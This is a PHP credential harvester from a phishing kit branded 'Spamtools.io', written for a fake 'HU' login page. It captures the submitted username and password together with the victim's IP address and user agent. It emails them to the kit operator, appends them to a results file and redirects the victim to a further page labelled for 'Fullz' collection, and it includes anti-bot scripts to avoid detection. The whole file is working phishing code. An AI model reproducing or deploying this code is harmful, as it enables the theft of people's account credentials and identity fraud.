<?php 
error_reporting(0);
include "bt.php";
include 'anti.php';
include 'email.php';
function getUserIpAddr(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        //ip from share internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        //ip pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
$ipp = getUserIpAddr();
$hostname = gethostbyaddr($ip);
$bilsmg = "------------[HU  - Spamtools.io]------------\n";
$bilsmg .= "User: ".$_POST['username']."\n";
$bilsmg .= "Password: ".$_POST['password']."\n";
$bilsmg .= "IP: ".getUserIpAddr()."\n";
$bilsmg.= "User Agent:".$_SERVER['HTTP_USER_AGENT'] ."\n";

$bilsmg .= "------------[HU  Fullz]------------\n";
$bilsub = "";
$bilhead = "MIME-Version: 2.0\n";
$subject="[spamtools.io]: HU Login | $ipp";
$headers="From: results@spamtools.com <iiinfo@spamtools.com>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
@mail($email,$subject,$bilsmg,$headers);$fp = fopen("results/login.txt", "a+");
fwrite($fp, $bilsmg);
fclose($fp);
header("Location: information.php");

?>
